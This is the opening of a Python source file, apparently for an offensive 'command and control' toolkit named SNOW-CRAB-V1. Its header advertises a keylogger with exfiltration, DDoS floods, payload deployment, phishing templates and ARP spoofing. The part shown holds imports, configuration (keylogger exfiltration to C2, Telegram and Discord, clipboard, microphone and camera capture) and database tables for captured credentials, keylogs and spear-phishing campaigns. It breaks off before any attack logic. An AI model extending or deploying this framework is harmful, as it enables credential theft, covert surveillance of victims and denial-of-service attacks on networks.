#!/usr/bin/env python3
"""
❄️ SNOW-CRAB-V1 - Ultimate Cybersecurity Command & Control Platform
Author: Ian Carter Kulani
Version: 1.0.0

A complete cybersecurity automation platform featuring:
- Multi-Platform Bot Integration (Discord, Telegram, WhatsApp, Slack, Google Chat, Signal, iMessage, Web)
- Stunning Blue Themed Web Dashboard with Bar & Pie Charts
- 100+ Phishing Templates for Social Engineering
- All Ping/Traceroute/Nmap/Netcat/Curl Commands
- Shodan Integration
- Advanced Keylogger with Exfiltration
- REAL Traffic Generation
- DDoS/DoS Attack Module
- Agent Mode for Remote Control
- Payload Generation & Deployment
- SSH Remote Access
- Password Cracking Engine
- ARP Spoofing & Network Manipulation
- MAC Address Management
- NAT Information
- Email Composition & Sending
- PDF Report Generation
- Docker Security Scanning
- Terminal Animations
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import getpass
import socketserver
import itertools
import string
import ctypes
import queue
import secrets
import smtplib
import email.message
import tempfile
import zipfile
import tarfile
import gzip
import csv
import xml.etree.ElementTree as ET
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union, Callable
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import Counter, defaultdict, deque
from enum import Enum
from functools import wraps
from abc import ABC, abstractmethod
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# =====================
# VERSION & METADATA
# =====================
VERSION = "1.0.0"
NAME = "SNOW-CRAB-V1"
AUTHOR = "Ian Carter Kulani"
DESCRIPTION = "Ultimate Cybersecurity Command & Control Platform"

# =====================
# DEPENDENCY CHECK & IMPORTS
# =====================

# Colorama for terminal colors
try:
    import colorama
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

# Cryptography
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# SSH
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, SFTPClient, Transport
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# Signal CLI
SIGNAL_AVAILABLE = shutil.which('signal-cli') is not None

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Google Chat
try:
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# WhatsApp (pywhatkit)
try:
    import pywhatkit
    WHATSAPP_AVAILABLE = True
except ImportError:
    WHATSAPP_AVAILABLE = False

# Web Framework
try:
    from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file, send_from_directory
    from flask_socketio import SocketIO, emit
    from flask_cors import CORS
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sr1, srp, sniff, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# Shodan
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Data Visualization
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import seaborn as sns
    import numpy as np
    GRAPHICS_AVAILABLE = True
except ImportError:
    GRAPHICS_AVAILABLE = False

# PDF Generation
try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    from reportlab.pdfgen import canvas
    from reportlab.lib.colors import HexColor
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

# Keylogger
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

# DNS Python
try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# BeautifulSoup
try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

# =====================
# BLUE & WHITE THEME
# =====================
if COLORAMA_AVAILABLE:
    class Colors:
        # Primary Blue & White Theme
        BLUE = Fore.BLUE + Style.BRIGHT
        LIGHTBLUE = Fore.LIGHTBLUE_EX + Style.BRIGHT
        DARKBLUE = Fore.BLUE + Style.DIM
        CYAN = Fore.CYAN + Style.BRIGHT
        LIGHTCYAN = Fore.LIGHTCYAN_EX + Style.BRIGHT
        
        # White colors
        WHITE = Fore.WHITE + Style.BRIGHT
        LIGHTWHITE = Fore.LIGHTWHITE_EX + Style.BRIGHT
        
        # Status colors
        SUCCESS = Fore.GREEN + Style.BRIGHT
        WARNING = Fore.YELLOW + Style.BRIGHT
        ERROR = Fore.RED + Style.BRIGHT
        INFO = Fore.CYAN + Style.BRIGHT
        DANGER = Fore.RED + Style.BRIGHT
        
        # Basic colors
        BLACK = Fore.BLACK + Style.BRIGHT
        GREEN = Fore.GREEN + Style.BRIGHT
        YELLOW = Fore.YELLOW + Style.BRIGHT
        RED = Fore.RED + Style.BRIGHT
        MAGENTA = Fore.MAGENTA + Style.BRIGHT
        GRAY = Fore.LIGHTBLACK_EX + Style.BRIGHT
        
        # Styles
        RESET = Style.RESET_ALL
        BOLD = Style.BRIGHT
        DIM = Style.DIM
        
        # Background colors
        BG_BLUE = Back.BLUE + Fore.WHITE
        BG_WHITE = Back.WHITE + Fore.BLUE
        BG_CYAN = Back.CYAN + Fore.BLACK
        BG_DARK = Back.BLACK + Fore.WHITE
else:
    class Colors:
        BLUE = LIGHTBLUE = DARKBLUE = CYAN = LIGHTCYAN = WHITE = LIGHTWHITE = ""
        SUCCESS = WARNING = ERROR = INFO = DANGER = BLACK = GREEN = YELLOW = RED = ""
        MAGENTA = GRAY = RESET = BOLD = DIM = BG_BLUE = BG_WHITE = BG_CYAN = BG_DARK = ""

# =====================
# DIRECTORY CONFIGURATION
# =====================
CONFIG_DIR = ".snow_crab_v1"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "snow_crab.db")
LOG_FILE = os.path.join(CONFIG_DIR, "snow_crab.log")
KEYLOG_FILE = os.path.join(CONFIG_DIR, "keylog.txt")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
REPORT_DIR = "snow_crab_reports"
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
TEMP_DIR = "temp"
WEB_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "web_templates")
SESSION_DIR = os.path.join(CONFIG_DIR, "sessions")
SPEAR_PHISHING_DIR = os.path.join(CONFIG_DIR, "spear_phishing")
EMAIL_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "email_templates")
DOS_LOGS_DIR = os.path.join(CONFIG_DIR, "dos_logs")
AGENT_DIR = os.path.join(CONFIG_DIR, "agents")
C2_LOGS_DIR = os.path.join(CONFIG_DIR, "c2_logs")
MODULES_DIR = os.path.join(CONFIG_DIR, "modules")
NETWORK_MONITOR_DIR = os.path.join(CONFIG_DIR, "network_monitor")
KEYLOG_EXFIL_DIR = os.path.join(CONFIG_DIR, "keylog_exfil")
DEPLOYMENT_DIR = os.path.join(CONFIG_DIR, "deployments")
DOMAIN_HOSTING_DIR = os.path.join(CONFIG_DIR, "domain_hosting")
CRACKING_DIR = os.path.join(CONFIG_DIR, "cracking")
ARP_LOGS_DIR = os.path.join(CONFIG_DIR, "arp_logs")
MAC_LOGS_DIR = os.path.join(CONFIG_DIR, "mac_logs")
NAT_LOGS_DIR = os.path.join(CONFIG_DIR, "nat_logs")
ANIMATION_CACHE_DIR = os.path.join(CONFIG_DIR, "animation_cache")
PLATFORM_LOGS_DIR = os.path.join(CONFIG_DIR, "platform_logs")
DOCKER_SCANS_DIR = os.path.join(CONFIG_DIR, "docker_scans")
EMAIL_COMPOSER_DIR = os.path.join(CONFIG_DIR, "email_composer")
PDF_REPORTS_DIR = os.path.join(REPORT_DIR, "pdf_reports")
TEMPLATES_DIR = os.path.join(CONFIG_DIR, "templates")
CUSTOM_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "custom_templates")
THREAT_MONITOR_DIR = os.path.join(CONFIG_DIR, "threat_monitor")
CHART_DIR = os.path.join(REPORT_DIR, "charts")

# Create all directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR, REPORT_DIR,
    PHISHING_DIR, PHISHING_TEMPLATES_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR, GRAPHICS_DIR,
    TEMP_DIR, WEB_TEMPLATES_DIR, SESSION_DIR, SPEAR_PHISHING_DIR,
    EMAIL_TEMPLATES_DIR, DOS_LOGS_DIR, AGENT_DIR, C2_LOGS_DIR,
    MODULES_DIR, NETWORK_MONITOR_DIR, KEYLOG_EXFIL_DIR, DEPLOYMENT_DIR,
    DOMAIN_HOSTING_DIR, CRACKING_DIR, ARP_LOGS_DIR, MAC_LOGS_DIR, 
    NAT_LOGS_DIR, ANIMATION_CACHE_DIR, PLATFORM_LOGS_DIR,
    DOCKER_SCANS_DIR, EMAIL_COMPOSER_DIR, PDF_REPORTS_DIR,
    TEMPLATES_DIR, CUSTOM_TEMPLATES_DIR, THREAT_MONITOR_DIR, CHART_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SNOW-CRAB-V1 - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("SnowCrabV1")

# =====================
# ENUMS
# =====================
class TrafficType(Enum):
    """Traffic generation types"""
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    TCP_FIN = "tcp_fin"
    TCP_RST = "tcp_rst"
    TCP_PSH_ACK = "tcp_psh_ack"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTP_PUT = "http_put"
    HTTPS = "https"
    DNS = "dns"
    DNS_QUERY = "dns_query"
    ARP = "arp"
    ARP_REPLY = "arp_reply"
    DHCP = "dhcp"
    NTP = "ntp"
    SNMP = "snmp"
    SMTP = "smtp"
    FTP = "ftp"
    SSH = "ssh"
    TELNET = "telnet"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    ICMP_FLOOD = "icmp_flood"
    SLOWLORIS = "slowloris"
    MIXED = "mixed"
    RANDOM = "random"

class ScanType(Enum):
    """Port scanning types"""
    PING = "ping"
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    FULL = "full"
    UDP = "udp"
    TCP_SYN = "tcp_syn"
    TCP_CONNECT = "tcp_connect"
    TCP_FIN = "tcp_fin"
    TCP_XMAS = "tcp_xmas"
    TCP_NULL = "tcp_null"
    TCP_ACK = "tcp_ack"
    TCP_WINDOW = "tcp_window"
    OS = "os_detection"
    SERVICE = "service_detection"
    VERSION = "version_detection"
    VULNERABILITY = "vulnerability"
    WEB = "web"
    SCRIPT = "script"

class Severity(Enum):
    """Severity levels"""
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class Platform(Enum):
    """Platform types"""
    DISCORD = "discord"
    SLACK = "slack"
    TELEGRAM = "telegram"
    SIGNAL = "signal"
    IMESSAGE = "imessage"
    GOOGLE_CHAT = "google_chat"
    WEB = "web"
    WHATSAPP = "whatsapp"
    CLI = "cli"
    API = "api"

class DeploymentType(Enum):
    """Deployment types"""
    PDF = "pdf"
    EMAIL = "email"
    LINK = "link"
    EXECUTABLE = "executable"
    DOCUMENT = "document"
    MACRO = "macro"
    SCRIPT = "script"
    IMAGE = "image"
    VIDEO = "video"
    ARCHIVE = "archive"

# =====================
# DATA CLASSES
# =====================
@dataclass
class CommandResult:
    """Result of a command execution"""
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None
    timestamp: str = field(default_factory=lambda: datetime.datetime.now().isoformat())

@dataclass
class SSHConnection:
    """SSH connection information"""
    id: str
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: Optional[str] = None
    key_path: Optional[str] = None
    status: str = "disconnected"
    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
    last_used: Optional[str] = None

@dataclass
class TrafficGenerator:
    """Traffic generator information"""
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"

@dataclass
class PhishingLink:
    """Phishing link information"""
    id: str
    platform: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0

@dataclass
class CapturedCredential:
    """Captured credential information"""
    id: int
    link_id: str
    timestamp: str
    username: str
    password: str
    ip_address: str
    user_agent: str

@dataclass
class ThreatAlert:
    """Threat alert information"""
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class SpearPhishingCampaign:
    """Spear phishing campaign information"""
    id: str
    name: str
    template: str
    subject: str
    from_email: str
    targets: List[Dict]
    sent_count: int = 0
    open_count: int = 0
    click_count: int = 0
    status: str = "draft"
    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
    scheduled_time: Optional[str] = None

@dataclass
class KeylogEntry:
    """Keylog entry information"""
    timestamp: str
    text: str
    window: str
    process: str
    screenshot: Optional[str] = None

@dataclass
class Deployment:
    """Deployment information"""
    id: str
    name: str
    type: str
    payload: str
    target: str
    created_at: str
    delivered: bool = False
    opened: bool = False
    executed: bool = False

@dataclass
class DomainHost:
    """Domain host information"""
    id: str
    ip: str
    domain: str
    hosting_path: str
    created_at: str
    active: bool = True

@dataclass
class ARPSpoofResult:
    """ARP spoof result information"""
    target_ip: str
    gateway_ip: str
    interface: str
    status: str
    packets_sent: int
    duration: float
    started_at: str
    ended_at: str

@dataclass
class MACInfo:
    """MAC address information"""
    mac_address: str
    vendor: str
    ip_address: str
    hostname: str
    first_seen: str
    last_seen: str

@dataclass
class NATInfo:
    """NAT information"""
    public_ip: str
    private_ip: str
    router_ip: str
    country: str
    isp: str
    nat_type: str

@dataclass
class EmailMessage:
    """Email message information"""
    to: str
    subject: str
    body: str
    from_email: str
    attachments: List[str] = field(default_factory=list)
    html: bool = False
    sent_at: Optional[str] = None
    status: str = "draft"

@dataclass
class PDFReport:
    """PDF report information"""
    title: str
    target: str
    analysis: Dict
    timestamp: str
    file_path: str
    status: str = "generated"

@dataclass
class PortScanResult:
    """Port scan result"""
    port: int
    state: str
    service: str
    version: str = ""
    banner: str = ""

@dataclass
class Vulnerability:
    """Vulnerability information"""
    id: str
    name: str
    description: str
    severity: str
    cvss_score: float
    affected_component: str
    remediation: str

@dataclass
class NetworkHost:
    """Network host information"""
    ip: str
    hostname: str
    mac: str
    os: str
    ports: List[PortScanResult]
    status: str

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    """Configuration manager for SNOW-CRAB-V1"""
    
    DEFAULT_CONFIG = {
        "version": VERSION,
        "auto_start": False,
        "auto_block_enabled": False,
        "auto_block_threshold": 5,
        "scan_timeout": 30,
        "report_format": "both",
        "generate_graphics": True,
        "animations": {
            "enabled": True,
            "startup": "matrix_rain",
            "loading": "spinner",
            "success": "pulse",
            "error": "glitch",
            "duration": 2.0
        },
        "keylogger": {
            "enabled": False,
            "hotkey": "f10",
            "log_file": KEYLOG_FILE,
            "c2_server": "",
            "upload_interval": 30,
            "exfil_methods": ["file", "email", "c2", "telegram", "discord"],
            "screenshot_interval": 60,
            "capture_clipboard": True,
            "capture_mic": False,
            "capture_cam": False
        },
        "web": {
            "enabled": True,
            "port": 5000,
            "host": "0.0.0.0",
            "secret_key": "",
            "require_auth": True,
            "username": "admin",
            "password_hash": ""
        },
        "email": {
            "smtp_server": "",
            "smtp_port": 587,
            "smtp_username": "",
            "smtp_password": "",
            "from_email": "",
            "tls": True
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin"
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "prefix": "/"
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "app_token": "",
            "channel_id": "",
            "prefix": "!"
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "group_id": "",
            "prefix": "!"
        },
        "google_chat": {
            "enabled": False,
            "webhook_url": "",
            "space_id": "",
            "prefix": "/"
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "prefix": "!"
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "prefix": "!"
        },
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "http_flood_threshold": 200,
            "ddos_threshold": 1000,
            "scan_interval": 300
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_port": 8080,
            "capture_credentials": True,
            "auto_shorten_urls": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5
        },
        "spear_phishing": {
            "enabled": True,
            "smtp_server": "",
            "smtp_port": 587,
            "smtp_username": "",
            "smtp_password": "",
            "track_opens": True,
            "track_clicks": True
        },
        "dos": {
            "enabled": True,
            "max_threads": 100,
            "default_timeout": 60,
            "attack_types": ["syn", "udp", "http", "icmp"]
        },
        "agent": {
            "enabled": False,
            "server_url": "",
            "heartbeat_interval": 30,
            "command_poll_interval": 5
        },
        "network_monitor": {
            "enabled": True,
            "interface": "eth0",
            "promiscuous": False,
            "packet_capture_limit": 1000
        },
        "deployment": {
            "enabled": True,
            "pdf_template": "",
            "email_template": "",
            "link_expiry": 3600,
            "download_url": ""
        },
        "cracking": {
            "enabled": True,
            "hashcat_path": "",
            "wordlist_path": "",
            "default_hash_type": 0,
            "max_threads": 4
        },
        "arp_spoofing": {
            "enabled": True,
            "interface": "eth0",
            "enable_ip_forward": True,
            "sniff_interval": 60
        },
        "shodan": {
            "enabled": False,
            "api_key": ""
        },
        "docker": {
            "enabled": True,
            "scan_timeout": 300,
            "benchmark_enabled": True
        }
    }
    
    def __init__(self):
        self.config_dir = Path(CONFIG_DIR)
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / "config.json"
        self.config = self.load()
    
    def load(self) -> Dict:
        """Load configuration from file"""
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    for key, value in self.DEFAULT_CONFIG.items():
                        if key not in loaded:
                            loaded[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in loaded[key]:
                                    loaded[key][sub_key] = sub_value
                    return loaded
        except Exception as e:
            print(f"Failed to load config: {e}")
        return self.DEFAULT_CONFIG.copy()
    
    def save(self) -> bool:
        """Save configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            print(f"Failed to save config: {e}")
            return False
    
    def get(self, key: str, default=None):
        """Get configuration value using dot notation"""
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k, default)
            else:
                return default
        return value
    
    def set(self, key: str, value: Any) -> bool:
        """Set configuration value using dot notation"""
        keys = key.split('.')
        target = self.config
        for k in keys[:-1]:
            if k not in target:
                target[k] = {}
            target = target[k]
        target[keys[-1]] = value
        return self.save()

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """SQLite database manager for SNOW-CRAB-V1"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        """Initialize all database tables"""
        tables = [
            # Command history
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT,
                user_id TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            # Threats
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            # Managed IPs
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                domain TEXT,
                added_by TEXT,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                threat_level INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )
            """,
            # MAC info
            """
            CREATE TABLE IF NOT EXISTS mac_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mac_address TEXT UNIQUE NOT NULL,
                vendor TEXT,
                ip_address TEXT,
                hostname TEXT,
                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen DATETIME
            )
            """,
            # ARP spoofing
            """
            CREATE TABLE IF NOT EXISTS arp_spoofing (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_ip TEXT NOT NULL,
                gateway_ip TEXT NOT NULL,
                interface TEXT,
                status TEXT DEFAULT 'active',
                packets_sent INTEGER DEFAULT 0,
                duration REAL,
                started_at DATETIME,
                ended_at DATETIME,
                UNIQUE(target_ip, gateway_ip)
            )
            """,
            # Domain hosting
            """
            CREATE TABLE IF NOT EXISTS domain_hosting (
                id TEXT PRIMARY KEY,
                ip TEXT NOT NULL,
                domain TEXT NOT NULL UNIQUE,
                hosting_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1,
                port INTEGER DEFAULT 8080
            )
            """,
            # SSH connections
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )
            """,
            # SSH commands
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )
            """,
            # Traffic logs
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            # Nikto scans
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Phishing links
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            # Captured credentials
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            # Scans
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Users
            """
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                role TEXT DEFAULT 'user',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # Sessions
            """
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
            """,
            # Keylogs
            """
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                text TEXT,
                window TEXT,
                process TEXT,
                screenshot_path TEXT
            )
            """,
            # Spear phishing campaigns
            """
            CREATE TABLE IF NOT EXISTS spear_phishing_campaigns (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                template TEXT NOT NULL,
                subject TEXT NOT NULL,
                from_email TEXT NOT NULL,
                targets TEXT,
                sent_count INTEGER DEFAULT 0,
                open_count INTEGER DEFAULT 0,
                click_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                scheduled_time DATETIME
            )
            """,
            # Email tracking
            """
            CREATE TABLE IF NOT EXISTS email_tracking (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id TEXT NOT NULL,
                target_email TEXT NOT NULL,
                opened BOOLEAN DEFAULT 0,
                clicked BOOLEAN DEFAULT 0,
                opened_at DATETIME,
                clicked_at DATETIME,
                FOREIGN KEY (campaign_id) REFERENCES spear_phishing_campaigns(id)
            )
            """,
            # DOS attacks
            """
            CREATE TABLE IF NOT EXISTS dos_attacks (
